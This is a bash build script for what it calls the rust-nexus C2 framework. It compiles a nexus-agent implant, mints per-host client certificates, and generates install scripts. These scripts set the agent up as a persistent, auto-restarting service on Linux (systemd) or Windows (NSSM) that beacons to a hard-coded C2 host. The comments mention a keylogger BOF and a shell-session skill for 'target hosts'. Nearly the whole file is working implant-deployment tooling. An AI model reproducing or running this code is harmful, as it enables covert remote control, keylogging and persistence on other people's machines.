#!/usr/bin/env bash
# scripts/build-agent-bundles.sh — build + cert-mint + bundle for N agents.
#
# Builds the nexus-agent binary for the requested OS, mints N Ed25519 client
# certs against the existing prod CA (without touching or re-generating the
# CA), and emits per-host dist bundles under dist/agents/<CN>/ containing the
# binary, CA cert, per-host client cert/key, and an OS-appropriate install
# script.
#
# Usage:
#   ./scripts/build-agent-bundles.sh --os win --count 3
#   ./scripts/build-agent-bundles.sh --os lin --count 2 --start-index 4
#   ./scripts/build-agent-bundles.sh --os win --count 3 --no-build --force
#
# Required:
#   --os lin|win         target OS (lin = Linux x86-64, win = Windows x86-64)
#   --count N            number of per-host bundles to produce
#
# Optional:
#   --start-index N      start numbering at N (default 1); use to add more
#                        agents without colliding with existing CNs
#   --prefix NAME        override the CN prefix (default: agent-lin or
#                        agent-win depending on --os)
#   --certs-dir PATH     directory containing ca.crt.pem + ca.key.pem
#                        (default: ./certs/prod)
#   --out PATH           bundle output root (default: ./dist/agents)
#   --server-addr URL    C2 address written into per-bundle env/config
#                        (default: https://c2.onoiroi.us:50052)
#   --days N             client cert validity in days (default: 365)
#   --no-build           skip cargo build; fail if artifact is missing
#   --force              overwrite existing bundle dirs (mints fresh certs,
#                        invalidating previous ones for that host)
#   -h | --help          print this help and exit
#
# Requires: openssl >= 1.1.1, cargo (unless --no-build),
#           x86_64-w64-mingw32-gcc (win target only, unless --no-build)

set -euo pipefail

# ---------- defaults ----------
OS=""
COUNT=""
START_INDEX=1
PREFIX=""
CERTS_DIR="./certs/prod"
OUT_DIR="./dist/agents"
SERVER_ADDR="https://c2.onoiroi.us:50052"
DAYS=365
NO_BUILD=0
FORCE=0

log() { echo "[build-agent-bundles] $*"; }
die() { echo "[build-agent-bundles] error: $*" >&2; exit 2; }

usage() {
    sed -n '/^#!/d; /^#/!q; s/^# \{0,1\}//; p' "$0"
    exit 0
}

# ---------- arg parsing ----------
while [[ $# -gt 0 ]]; do
    case "$1" in
        --os)           OS="$2"; shift 2 ;;
        --count)        COUNT="$2"; shift 2 ;;
        --start-index)  START_INDEX="$2"; shift 2 ;;
        --prefix)       PREFIX="$2"; shift 2 ;;
        --certs-dir)    CERTS_DIR="$2"; shift 2 ;;
        --out)          OUT_DIR="$2"; shift 2 ;;
        --server-addr)  SERVER_ADDR="$2"; shift 2 ;;
        --days)         DAYS="$2"; shift 2 ;;
        --no-build)     NO_BUILD=1; shift ;;
        --force)        FORCE=1; shift ;;
        -h|--help)      usage ;;
        *) die "unknown argument: $1" ;;
    esac
done

# ---------- validation ----------
[[ -n "$OS" ]]    || die "--os is required (lin or win)"
[[ -n "$COUNT" ]] || die "--count is required"

[[ "$OS" == "lin" || "$OS" == "win" ]] || die "--os must be 'lin' or 'win', got: $OS"

[[ "$COUNT" =~ ^[1-9][0-9]*$ ]]       || die "--count must be a positive integer, got: $COUNT"
[[ "$START_INDEX" =~ ^[1-9][0-9]*$ ]] || die "--start-index must be a positive integer, got: $START_INDEX"
[[ "$DAYS" =~ ^[1-9][0-9]*$ ]]        || die "--days must be a positive integer, got: $DAYS"

command -v openssl >/dev/null 2>&1 || die "openssl not found on PATH"
if [[ $NO_BUILD -eq 0 ]]; then
    command -v cargo >/dev/null 2>&1 || die "cargo not found on PATH (install rustup or pass --no-build)"
fi

# Set default prefix after OS is validated
if [[ -z "$PREFIX" ]]; then
    [[ "$OS" == "win" ]] && PREFIX="agent-win" || PREFIX="agent-lin"
fi

# Widen to %03d if the range exceeds 99
END_INDEX=$(( START_INDEX + COUNT - 1 ))
if [[ $END_INDEX -ge 100 ]]; then
    PAD="%03d"
else
    PAD="%02d"
fi

# ---------- CA validation ----------
CA_CRT="${CERTS_DIR}/ca.crt.pem"
CA_KEY="${CERTS_DIR}/ca.key.pem"

[[ -f "$CA_CRT" ]] || die "CA cert not found: $CA_CRT  (run scripts/gen-certs-prod.sh first)"
[[ -f "$CA_KEY" ]] || die "CA key not found: $CA_KEY  (run scripts/gen-certs-prod.sh first)"
[[ -r "$CA_KEY" ]] || die "CA key not readable: $CA_KEY  (check permissions)"

log "CA: $CA_CRT"
log "os=$OS count=$COUNT start_index=$START_INDEX prefix=$PREFIX"

# ---------- build phase ----------
if [[ $NO_BUILD -eq 1 ]]; then
    log "skipping build (--no-build)"
    if [[ "$OS" == "win" ]]; then
        ARTIFACT="target/x86_64-pc-windows-gnu/release/nexus-agent.exe"
    else
        ARTIFACT="target/release/nexus-agent"
    fi
    [[ -f "$ARTIFACT" ]] || die "artifact not found: $ARTIFACT  (drop --no-build to build it)"
    log "using existing artifact: $ARTIFACT"
else
    if [[ "$OS" == "win" ]]; then
        if ! command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
            die "MinGW cross-compiler not found. Install with:
  sudo apt-get install mingw-w64
  rustup target add x86_64-pc-windows-gnu"
        fi
        log "building nexus-agent for Windows (x86_64-pc-windows-gnu)"
        log "NOTE: keylogger BOF is stubbed when cross-compiling from Linux (build.rs uses"
        log "      cfg!(target_os=windows) which evaluates on the build host, not the target)."
        log "      The agent will run; the keylogger skill will not be available."
        cargo build --release --target x86_64-pc-windows-gnu -p nexus-agent --bin nexus-agent
        ARTIFACT="target/x86_64-pc-windows-gnu/release/nexus-agent.exe"
    else
        log "building nexus-agent for Linux"
        cargo build --release -p nexus-agent --bin nexus-agent
        ARTIFACT="target/release/nexus-agent"
    fi
    log "build complete: $ARTIFACT"
fi

# ---------- cert mint phase ----------
# All certs are minted into a temp dir first. If any step fails, the trap
# cleans up so certs/prod/ is never polluted with partial leaves.
TMPDIR_CERTS="$(mktemp -d)"
trap 'rm -rf "$TMPDIR_CERTS"' EXIT

cat > "${TMPDIR_CERTS}/client.ext.cnf" <<EOF
extendedKeyUsage = clientAuth
basicConstraints = critical, CA:false
keyUsage = critical, digitalSignature
EOF

log "minting $COUNT client cert(s) from $CA_CRT"
for i in $(seq "$START_INDEX" "$END_INDEX"); do
    CN="$(printf "${PREFIX}${PAD}" "$i")"
    log "  minting $CN"
    openssl genpkey -algorithm ED25519 -out "${TMPDIR_CERTS}/${CN}.key.pem" 2>/dev/null
    openssl req -new -key "${TMPDIR_CERTS}/${CN}.key.pem" \
        -out "${TMPDIR_CERTS}/${CN}.csr.pem" \
        -subj "/C=US/O=rust-nexus/OU=v1.2-prod-certs/CN=${CN}" 2>/dev/null
    openssl x509 -req \
        -in "${TMPDIR_CERTS}/${CN}.csr.pem" \
        -CA "$CA_CRT" -CAkey "$CA_KEY" -CAcreateserial \
        -days "$DAYS" \
        -out "${TMPDIR_CERTS}/${CN}.crt.pem" \
        -extfile "${TMPDIR_CERTS}/client.ext.cnf" 2>/dev/null
    rm -f "${TMPDIR_CERTS}/${CN}.csr.pem"
    chmod 600 "${TMPDIR_CERTS}/${CN}.key.pem"
    chmod 644 "${TMPDIR_CERTS}/${CN}.crt.pem"
done
# Remove any stray serial file from the CA dir that openssl -CAcreateserial may have written
rm -f "${CERTS_DIR}/ca.srl"

log "all certs minted cleanly"

# ---------- bundle phase ----------
mkdir -p "$OUT_DIR"

for i in $(seq "$START_INDEX" "$END_INDEX"); do
    CN="$(printf "${PREFIX}${PAD}" "$i")"
    BUNDLE="${OUT_DIR}/${CN}"

    if [[ -d "$BUNDLE" ]]; then
        if [[ $FORCE -eq 0 ]]; then
            die "bundle dir already exists: $BUNDLE  (use --force to overwrite; this mints fresh certs)"
        fi
        log "  overwriting existing bundle: $BUNDLE (--force)"
        rm -rf "$BUNDLE"
    fi

    mkdir -p "$BUNDLE"

    # binary (canonical name regardless of OS)
    if [[ "$OS" == "win" ]]; then
        cp "$ARTIFACT" "${BUNDLE}/nexus-agent.exe"
    else
        cp "$ARTIFACT" "${BUNDLE}/nexus-agent"
        chmod 755 "${BUNDLE}/nexus-agent"
    fi

    # CA cert
    cp "$CA_CRT" "${BUNDLE}/ca.crt.pem"
    chmod 644 "${BUNDLE}/ca.crt.pem"

    # per-host client cert + key
    cp "${TMPDIR_CERTS}/${CN}.crt.pem" "${BUNDLE}/client.crt.pem"
    cp "${TMPDIR_CERTS}/${CN}.key.pem" "${BUNDLE}/client.key.pem"
    chmod 644 "${BUNDLE}/client.crt.pem"
    chmod 600 "${BUNDLE}/client.key.pem"

    # ---------- OS-specific helpers ----------
    if [[ "$OS" == "lin" ]]; then
        # agent.env
        cat > "${BUNDLE}/agent.env" <<EOF
NEXUS_CA_CERT=/etc/nexus-agent/ca.crt.pem
NEXUS_CLIENT_CERT=/etc/nexus-agent/client.crt.pem
NEXUS_CLIENT_KEY=/etc/nexus-agent/client.key.pem
NEXUS_SERVER_ADDR=${SERVER_ADDR}
RUST_LOG=info
EOF

        # install-linux.sh
        cat > "${BUNDLE}/install-linux.sh" <<'SCRIPT_EOF'
#!/usr/bin/env bash
# install-linux.sh — deploy this nexus-agent bundle on a Linux host.
# Run as root (or with sudo).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INSTALL_ROOT="/etc/nexus-agent"
DATA_ROOT="/var/lib/nexus-agent"
SVC_USER="nexus-agent"
SVC_NAME="nexus-agent"

echo "[install] creating user and directories"
id "$SVC_USER" >/dev/null 2>&1 || \
    useradd --system --no-create-home --shell /usr/sbin/nologin "$SVC_USER"
mkdir -p "$INSTALL_ROOT" "$DATA_ROOT"
chown "$SVC_USER:$SVC_USER" "$DATA_ROOT"

echo "[install] installing files"
install -m 0755 -o root       -g root         "$SCRIPT_DIR/nexus-agent"     /usr/local/bin/nexus-agent
install -m 0644 -o root       -g nexus-agent  "$SCRIPT_DIR/ca.crt.pem"      "${INSTALL_ROOT}/ca.crt.pem"
install -m 0644 -o root       -g nexus-agent  "$SCRIPT_DIR/client.crt.pem"  "${INSTALL_ROOT}/client.crt.pem"
install -m 0600 -o nexus-agent -g nexus-agent "$SCRIPT_DIR/client.key.pem"  "${INSTALL_ROOT}/client.key.pem"
install -m 0640 -o root       -g nexus-agent  "$SCRIPT_DIR/agent.env"       "${INSTALL_ROOT}/agent.env"

echo "[install] writing systemd unit"
cat > /etc/systemd/system/nexus-agent.service <<EOF
[Unit]
Description=rust-nexus C2 agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=${SVC_USER}
EnvironmentFile=${INSTALL_ROOT}/agent.env
ExecStart=/usr/local/bin/nexus-agent
Restart=on-failure
RestartSec=10s
WorkingDirectory=${DATA_ROOT}

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now "$SVC_NAME"
echo "[install] done. Tailing journal (ctrl-c to stop):"
journalctl -u "$SVC_NAME" -f
SCRIPT_EOF
        chmod 755 "${BUNDLE}/install-linux.sh"

    else
        # install-windows.ps1
        cat > "${BUNDLE}/install-windows.ps1" <<PSEOF
# install-windows.ps1 — deploy this nexus-agent bundle on a Windows host.
# Run from an elevated (Administrator) PowerShell prompt.
#Requires -RunAsAdministrator

\$ErrorActionPreference = 'Stop'
\$root  = 'C:\ProgramData\nexus-agent'
\$svc   = 'nexus-agent'
\$exe   = "\$root\nexus-agent.exe"
\$here  = Split-Path -Parent \$MyInvocation.MyCommand.Path

Write-Host "[install] creating install directory: \$root"
New-Item -Path \$root -ItemType Directory -Force | Out-Null

Write-Host "[install] copying files"
Copy-Item "\$here\nexus-agent.exe"  "\$exe"          -Force
Copy-Item "\$here\ca.crt.pem"       "\$root\ca.crt.pem"     -Force
Copy-Item "\$here\client.crt.pem"   "\$root\client.crt.pem" -Force
Copy-Item "\$here\client.key.pem"   "\$root\client.key.pem" -Force

Write-Host "[install] locking down client.key.pem"
\$key = "\$root\client.key.pem"
icacls \$key /inheritance:r | Out-Null
icacls \$key /grant:r "SYSTEM:(R)" "Administrators:(R)" | Out-Null

# --- NSSM setup ---
if (-not (Get-Command nssm -ErrorAction SilentlyContinue)) {
    Write-Host "[install] downloading NSSM..."
    \$tmp = "\$env:TEMP\nssm.zip"
    Invoke-WebRequest -Uri 'https://nssm.cc/release/nssm-2.24.zip' -OutFile \$tmp
    Expand-Archive \$tmp -DestinationPath "\$env:TEMP\nssm_extract" -Force
    Copy-Item "\$env:TEMP\nssm_extract\nssm-2.24\win64\nssm.exe" 'C:\Windows\System32\nssm.exe'
    Remove-Item \$tmp -Force
    Remove-Item "\$env:TEMP\nssm_extract" -Recurse -Force
}

\$existing = Get-Service \$svc -ErrorAction SilentlyContinue
if (\$existing) {
    Write-Host "[install] stopping existing service"
    nssm stop \$svc confirm 2>\$null
    nssm remove \$svc confirm 2>\$null
}

Write-Host "[install] registering service with NSSM"
nssm install \$svc \$exe
nssm set \$svc AppDirectory \$root
nssm set \$svc Start SERVICE_AUTO_START
nssm set \$svc AppStdout "\$root\agent.out.log"
nssm set \$svc AppStderr "\$root\agent.err.log"
nssm set \$svc AppRotateFiles 1
nssm set \$svc AppRotateBytes 10485760

nssm set \$svc AppEnvironmentExtra \`
    "NEXUS_CA_CERT=\$root\ca.crt.pem" \`
    "NEXUS_CLIENT_CERT=\$root\client.crt.pem" \`
    "NEXUS_CLIENT_KEY=\$root\client.key.pem" \`
    "NEXUS_SERVER_ADDR=${SERVER_ADDR}" \`
    "RUST_LOG=info"

Write-Host "[install] starting service"
nssm start \$svc

Write-Host "[install] done. Service status:"
Get-Service \$svc

Write-Host ""
Write-Host "Logs: \$root\agent.out.log  (stdout)"
Write-Host "      \$root\agent.err.log  (stderr)"
Write-Host ""
Write-Host "After the agent connects, check the C2 server journal for:"
Write-Host "  INFO agent registered peer_id=<hex>"
Write-Host "Then add that peer_id to /etc/nexus/capabilities.json on the server."
PSEOF
    fi

    # ---------- README.txt ----------
    if [[ "$OS" == "win" ]]; then
        BOF_NOTE="NOTE: keylogger BOF is NOT included in this binary. This agent was
       cross-compiled from Linux; the BOF requires MSVC (cl.exe) on the
       build host. All other skills are fully functional."
        DEPLOY_STEPS="1. Copy this folder to C:\\ProgramData\\nexus-agent\\ on the target host.
2. Open an elevated PowerShell prompt.
3. Run: .\\install-windows.ps1
4. Check logs at C:\\ProgramData\\nexus-agent\\agent.out.log"
        LOG_PATH="C:\\ProgramData\\nexus-agent\\agent.out.log  (stdout)
  C:\\ProgramData\\nexus-agent\\agent.err.log  (stderr)"
    else
        BOF_NOTE=""
        DEPLOY_STEPS="1. Copy this folder to the target Linux host.
2. Run as root: sudo bash install-linux.sh
3. Check logs: sudo journalctl -u nexus-agent -f"
        LOG_PATH="journalctl -u nexus-agent -f"
    fi

    cat > "${BUNDLE}/README.txt" <<EOF
nexus-agent bundle — ${CN}
============================================================

Agent CN  : ${CN}
Server    : ${SERVER_ADDR}
OS target : ${OS}
Cert valid: ${DAYS} days from issuance
CA issuer : $(openssl x509 -in "$CA_CRT" -noout -subject 2>/dev/null | sed 's/subject=//')

Deploy steps:
${DEPLOY_STEPS}

Logs:
  ${LOG_PATH}

After first start, the agent will emit its peer_id in the log:
  INFO NodeIdentity loaded identity_path=... peer_id=<hex>

The server will also log:
  INFO agent registered peer_id=<hex>

Add that peer_id to /etc/nexus/capabilities.json on the C2 server:
  {
    "agents": {
      "<peer_id>": { "skills": ["shell-session"], "label": "${CN}" }
    }
  }
Then restart nexus-server:
  sudo systemctl restart nexus-server

The NodeIdentity file on the agent host is the agent's permanent
identity. Back it up if you want the peer_id to survive a reinstall.
${BOF_NOTE:+
${BOF_NOTE}}
============================================================
EOF

    log "  bundle ready: $BUNDLE"
done

# ---------- summary ----------
cat <<EOF

[build-agent-bundles] done. ${COUNT} bundle(s) in: $(realpath "$OUT_DIR")

Bundles:
EOF

for i in $(seq "$START_INDEX" "$END_INDEX"); do
    CN="$(printf "${PREFIX}${PAD}" "$i")"
    BUNDLE="${OUT_DIR}/${CN}"
    if [[ "$OS" == "win" ]]; then
        echo "  ${CN}  →  ${BUNDLE}  (deploy: run install-windows.ps1 as Administrator)"
    else
        echo "  ${CN}  →  ${BUNDLE}  (deploy: sudo bash install-linux.sh)"
    fi
done

cat <<EOF

Verify a cert:
  openssl x509 -in ${OUT_DIR}/$(printf "${PREFIX}${PAD}" "$START_INDEX")/client.crt.pem \\
               -noout -subject -issuer

After each agent registers, add its peer_id to /etc/nexus/capabilities.json
on the C2 server and restart nexus-server.
EOF
